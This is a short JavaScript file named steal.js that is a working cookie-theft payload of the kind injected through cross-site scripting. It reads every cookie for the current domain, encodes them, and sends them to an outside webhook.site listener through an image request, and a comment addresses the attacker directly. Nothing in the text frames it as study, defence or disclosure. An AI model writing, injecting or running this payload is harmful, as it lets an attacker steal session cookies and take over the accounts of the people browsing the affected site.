// steal.js
(function(){
  // Read all cookies for the current domain
  const cookies = encodeURIComponent(document.cookie);
  // Send them to your listener
  new Image().src = 'https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890?c=' + cookies;
})();
